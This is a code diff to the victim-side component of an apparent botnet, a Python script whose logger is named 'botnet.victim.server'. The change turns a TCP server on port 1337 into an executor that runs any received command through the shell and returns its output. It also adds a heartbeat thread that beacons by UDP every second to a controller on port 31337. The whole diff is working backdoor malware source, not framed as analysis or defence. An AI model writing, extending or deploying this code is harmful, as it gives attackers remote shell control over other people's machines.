@@ -4,13 +4,17 @@ import logging
 import xml.etree.ElementTree
 import json
 import io
+import socket
+import threading
 
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(asctime).19s] %(levelname)s (%(name)s) %(message)s')
 log = logging.getLogger('botnet.victim.server')
 
 
-class MyTCPHandler(socketserver.BaseRequestHandler):
+class Executor(socketserver.BaseRequestHandler):
 
     def handle(self):
         log.debug('Receiving data')
@@ -43,7 +47,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
 
     def execute(self, command, timeout):
         log.debug('Executing command: %s with timeout: %s', command, timeout)
-        with subprocess.Popen(command, stdout=subprocess.PIPE) as proc:
+        with subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) as proc:
 
             try:
                 output, errors = proc.communicate(timeout=timeout)
@@ -53,7 +57,7 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                 return proc.kill()
 
             if errors:
-                log.error(errors)
+                log.error(errors.decode())
 
             if output:
                 # red = '\033[00;31m'
@@ -66,12 +70,34 @@ class MyTCPHandler(socketserver.BaseRequestHandler):
                 return message
 
 
-if __name__ == "__main__":
-    HOST, PORT = "localhost", 1337
+class Heartbeat:
 
-    log.info('Create the server, binding to localhost on port 9999')
-    server = socketserver.TCPServer((HOST, PORT), MyTCPHandler)
+    def __init__(self, host='localhost', port=31337):
+        log.debug('Starting ping hearthbeat')
+        self.host = host
+        self.port = port
 
-    # this will keep running until you interrupt the program with Ctrl-C
+    def start(self):
+        threading.Timer(1.0, self.ping).start()
+
+    def ping(self):
+        addr = (self.host, self.port)
+
+        log.debug('Ping sent to %s:%s' % addr)
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(bytes('%s:%s\n', 'utf-8'), addr)
+        sock.close()
+
+        self.start()
+
+
+if __name__ == '__main__':
+    HOST, PORT = 'localhost', 1337
+
+    log.info('Create the server')
+    server = socketserver.TCPServer((HOST, PORT), Executor)
+
+    Heartbeat().start()
+
     log.info('Server activated')
     server.serve_forever()
